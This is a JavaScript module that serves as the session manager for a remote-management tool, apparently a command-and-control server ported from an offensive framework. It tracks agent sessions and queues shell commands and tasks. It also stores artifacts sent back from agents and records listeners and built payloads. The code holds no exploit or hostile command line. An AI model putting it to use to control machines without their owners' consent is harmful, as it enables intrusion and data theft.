'use strict';

/**
 * PhantomRipperRMM — session manager (async, store-backed).
 * Ported from OSRipper's session_manager.py, extended with agent metadata,
 * event log, listener + payload records. Works on SQLite and MySQL.
 */

const crypto = require('crypto');
const fs = require('fs');
const path = require('path');
const store = require('./store');
const config = require('./config');

const WAITING = 'Waiting for response...';

function uid(n = 10) {
  return crypto.randomBytes(n).toString('hex').slice(0, n);
}

function taskUid() {
  return `tsk_${crypto.randomBytes(8).toString('hex')}`;
}

async function logEvent(category, message, level = 'info', meta = null) {
  await store.run(
    'INSERT INTO events (level, category, message, meta) VALUES (?, ?, ?, ?)',
    [level, category, message, meta ? JSON.stringify(meta) : null]
  );
}

async function getSessions(status) {
  if (status) {
    return store.all('SELECT * FROM sessions WHERE status = ? ORDER BY last_seen DESC', [status]);
  }
  return store.all('SELECT * FROM sessions ORDER BY last_seen DESC');
}

async function getSession(id) {
  return (await store.get('SELECT * FROM sessions WHERE id = ?', [id])) || null;
}

async function upsertSession(info) {
  const existing = await getSession(info.id);
  if (!existing) {
    await store.run(`
      INSERT INTO sessions
        (id, hostname, username, os, arch, pid, ip, country, privilege, agent_type, proto, caps, status, first_seen, last_seen)
      VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, 'active', datetime('now'), datetime('now'))
    `, [
      info.id,
      info.hostname || null,
      info.username || null,
      info.os || null,
      info.arch || null,
      info.pid || null,
      info.ip || null,
      info.country || null,
      info.privilege || 'user',
      info.agent_type || 'python',
      info.proto || (info.caps ? 'task' : 'legacy'),
      info.caps ? JSON.stringify(info.caps) : null,
    ]);
    await logEvent('session', `new session ${info.id} (${info.hostname || '?'} / ${info.os || '?'})`, 'info', {
      ip: info.ip,
      agent_type: info.agent_type,
    });
    return true;
  }
  await store.run(`
    UPDATE sessions SET
      hostname  = COALESCE(?, hostname),
      username  = COALESCE(?, username),
      os        = COALESCE(?, os),
      arch      = COALESCE(?, arch),
      pid       = COALESCE(?, pid),
      ip        = COALESCE(?, ip),
      privilege = COALESCE(?, privilege),
      proto     = COALESCE(?, proto),
      caps      = COALESCE(?, caps),
      status    = 'active',
      last_seen = datetime('now')
    WHERE id = ?
  `, [
    info.hostname || null,
    info.username || null,
    info.os || null,
    info.arch || null,
    info.pid || null,
    info.ip || null,
    info.privilege || null,
    info.proto || null,
    info.caps ? JSON.stringify(info.caps) : null,
    info.id,
  ]);
  return false;
}

async function touchSession(id) {
  await store.run("UPDATE sessions SET last_seen = datetime('now') WHERE id = ?", [id]);
}

async function queueCommand(sessionId, command, issuedBy = null) {
  const row = await store.get('SELECT command_queue FROM sessions WHERE id = ?', [sessionId]);
  if (!row) return false;
  const queue = safeParse(row.command_queue);
  queue.push({ command, queued_at: new Date().toISOString(), by: issuedBy });
  await store.run('UPDATE sessions SET command_queue = ? WHERE id = ?', [JSON.stringify(queue), sessionId]);
  await store.run(
    'INSERT INTO commands (session_id, command, response, issued_by) VALUES (?, ?, ?, ?)',
    [sessionId, command, WAITING, issuedBy]
  );
  await logEvent('command', `queued on ${sessionId}: ${command}`, 'info', { by: issuedBy });
  return true;
}

async function nextCommand(sessionId) {
  const row = await store.get('SELECT command_queue FROM sessions WHERE id = ?', [sessionId]);
  if (!row) return null;
  const queue = safeParse(row.command_queue);
  if (!queue.length) return null;
  const item = queue.shift();
  await store.run('UPDATE sessions SET command_queue = ? WHERE id = ?', [JSON.stringify(queue), sessionId]);
  return item && typeof item === 'object' ? item : { command: item };
}

// ---- structured tasks -------------------------------------------------------

/** Queue a structured task {task_id, verb, args} and record it. */
async function createTask(sessionId, verb, args, issuedBy = null) {
  const row = await store.get('SELECT command_queue FROM sessions WHERE id = ?', [sessionId]);
  if (!row) return null;
  const task = {
    task_id: taskUid(),
    verb: String(verb || 'shell').slice(0, 64),
    args: args === undefined || args === null ? '' : String(args),
  };
  const queue = safeParse(row.command_queue);
  queue.push({ command: JSON.stringify(task), task_id: task.task_id, queued_at: new Date().toISOString(), by: issuedBy });
  await store.run('UPDATE sessions SET command_queue = ? WHERE id = ?', [JSON.stringify(queue), sessionId]);
  await store.run(
    `INSERT INTO tasks (id, session_id, verb, args, status, issued_by)
     VALUES (?, ?, ?, ?, 'queued', ?)`,
    [task.task_id, sessionId, task.verb, task.args, issuedBy]
  );
  await store.run(
    'INSERT INTO commands (session_id, command, task_id, response, issued_by) VALUES (?, ?, ?, ?, ?)',
    [sessionId, `${task.verb} ${task.args}`.trim(), task.task_id, WAITING, issuedBy]
  );
  await logEvent('task', `task ${task.verb} on ${sessionId}`, 'info', { by: issuedBy, task_id: task.task_id });
  return task;
}

/** Pops the queue; returns {command, task} where task may be null (legacy). */
async function nextTask(sessionId) {
  const item = await nextCommand(sessionId);
  if (!item) return null;
  if (item.task_id) {
    const task = await store.get('SELECT * FROM tasks WHERE id = ?', [item.task_id]);
    if (task) {
      await store.run("UPDATE tasks SET status = 'sent' WHERE id = ?", [task.id]);
      return {
        command: item.command,
        task: { task_id: task.id, verb: task.verb, args: task.args },
      };
    }
  }
  return { command: item.command, task: null };
}

async function completeTask(taskId, output, isError = false) {
  const status = isError ? 'error' : 'done';
  const r = await store.run(
    "UPDATE tasks SET status = ?, response = ?, executed_at = datetime('now') WHERE id = ?",
    [status, String(output ?? ''), taskId]
  );
  if (r.changes) {
    await store.run(
      "UPDATE commands SET response = ?, executed_at = datetime('now') WHERE task_id = ?",
      [String(output ?? ''), taskId]
    );
  }
  return r.changes > 0;
}

async function getTasks(sessionId, limit = 200) {
  return store.all(
    'SELECT * FROM tasks WHERE session_id = ? ORDER BY created_at DESC, id DESC LIMIT ?',
    [sessionId, limit]
  );
}

// ---- artifacts ---------------------------------------------------------------

function artifactDir(sessionId) {
  return path.join(config.buildDir, '..', 'artifacts', sessionId);
}

/** Persist artifact bytes to disk + record metadata. Returns the row. */
async function saveArtifact({ sessionId, taskId, kind, name, buffer }) {
  const safeName = String(name || 'artifact.bin').replace(/[^a-zA-Z0-9._-]/g, '_').slice(0, 120);
  const dir = artifactDir(sessionId);
  fs.mkdirSync(dir, { recursive: true });
  const fname = `${Date.now()}_${safeName}`;
  const fpath = path.join(dir, fname);
  fs.writeFileSync(fpath, buffer);
  const sha = crypto.createHash('sha256').update(buffer).digest('hex');
  const id = uid(10);
  await store.run(
    `INSERT INTO artifacts (id, session_id, task_id, kind, name, size, sha256, path)
     VALUES (?, ?, ?, ?, ?, ?, ?, ?)`,
    [id, sessionId, taskId || null, kind || 'file', safeName, buffer.length, sha, fpath]
  );
  await logEvent('artifact', `artifact ${safeName} from ${sessionId} (${buffer.length} B)`, 'info', {
    task_id: taskId, kind,
  });
  return { id, session_id: sessionId, task_id: taskId || null, kind: kind || 'file', name: safeName, size: buffer.length, sha256: sha };
}

async function getArtifacts(sessionId, limit = 500) {
  if (sessionId) {
    return store.all('SELECT id, session_id, task_id, kind, name, size, sha256, created_at FROM artifacts WHERE session_id = ? ORDER BY created_at DESC, id DESC LIMIT ?', [sessionId, limit]);
  }
  return store.all('SELECT id, session_id, task_id, kind, name, size, sha256, created_at FROM artifacts ORDER BY created_at DESC, id DESC LIMIT ?', [limit]);
}

async function getArtifact(id) {
  return store.get('SELECT * FROM artifacts WHERE id = ?', [id]);
}

async function saveResponse(sessionId, command, response) {
  const match = await store.get(`
    SELECT id FROM commands
    WHERE session_id = ? AND command = ? AND response = ?
    ORDER BY id DESC LIMIT 1
  `, [sessionId, command, WAITING]);

  if (match) {
    await store.run(
      "UPDATE commands SET response = ?, executed_at = datetime('now') WHERE id = ?",
      [response, match.id]
    );
    return 1;
  }
  await store.run(
    "INSERT INTO commands (session_id, command, response, executed_at) VALUES (?, ?, ?, datetime('now'))",
    [sessionId, command, response]
  );
  return 0;
}

async function getHistory(sessionId, limit = 200) {
  return store.all(
    'SELECT * FROM commands WHERE session_id = ? ORDER BY id ASC LIMIT ?',
    [sessionId, limit]
  );
}

async function setStatus(sessionId, status) {
  await store.run('UPDATE sessions SET status = ? WHERE id = ?', [status, sessionId]);
}

async function deleteSession(sessionId) {
  const r = await store.run('DELETE FROM sessions WHERE id = ?', [sessionId]);
  if (r.changes > 0) await logEvent('session', `deleted session ${sessionId}`, 'warn');
  return r.changes > 0;
}

async function isDeleted(sessionId) {
  return !(await getSession(sessionId));
}

async function stats() {
  const total = (await store.get('SELECT COUNT(*) AS n FROM sessions')).n;
  const active = (await store.get("SELECT COUNT(*) AS n FROM sessions WHERE status = 'active'")).n;
  const byOs = await store.all(
    "SELECT os, COUNT(*) AS n FROM sessions WHERE status='active' GROUP BY os"
  );
  const cmds = (await store.get('SELECT COUNT(*) AS n FROM commands')).n;
  const recent = (await store.get(
    "SELECT COUNT(*) AS n FROM sessions WHERE last_seen >= datetime('now','-15 minutes')"
  )).n;
  return { total, active, recent, commands: cmds, byOs };
}

async function recentEvents(limit = 50) {
  return store.all('SELECT * FROM events ORDER BY id DESC LIMIT ?', [limit]);
}

// ---- listeners -------------------------------------------------------------

async function createListener({ name, transport, host, port, path, profile }) {
  const id = uid(10);
  await store.run(`
    INSERT INTO listeners (id, name, transport, host, port, path, profile, enabled)
    VALUES (?, ?, ?, ?, ?, ?, ?, 1)
  `, [id, name, transport, host || null, port || null, path || null, profile ? JSON.stringify(profile) : null]);
  await logEvent('listener', `created listener ${name} (${transport})`, 'info');
  return id;
}

async function getListeners() {
  return store.all('SELECT * FROM listeners ORDER BY created_at DESC');
}

async function deleteListener(id) {
  return (await store.run('DELETE FROM listeners WHERE id = ?', [id])).changes > 0;
}

// ---- payloads --------------------------------------------------------------

async function recordPayload(p) {
  const id = uid(10);
  await store.run(`
    INSERT INTO payloads (id, name, agent_type, os_target, transport, options, filename, size, sha256, created_by)
    VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
  `, [
    id, p.name, p.agent_type, p.os_target, p.transport,
    p.options ? JSON.stringify(p.options) : null,
    p.filename || null, p.size || null, p.sha256 || null, p.created_by || null,
  ]);
  await logEvent('payload', `built ${p.name} (${p.agent_type}/${p.os_target})`, 'info');
  return id;
}

async function getPayloads() {
  return store.all('SELECT * FROM payloads ORDER BY created_at DESC');
}

function safeParse(v) {
  if (v == null) return [];
  if (typeof v === 'object') return Array.isArray(v) ? v : [];
  try { return JSON.parse(v); } catch (_) { return []; }
}

module.exports = {
  logEvent,
  getSessions,
  getSession,
  upsertSession,
  touchSession,
  queueCommand,
  nextCommand,
  createTask,
  nextTask,
  completeTask,
  getTasks,
  saveArtifact,
  getArtifacts,
  getArtifact,
  saveResponse,
  getHistory,
  setStatus,
  deleteSession,
  isDeleted,
  stats,
  recentEvents,
  createListener,
  getListeners,
  deleteListener,
  recordPayload,
  getPayloads,
};
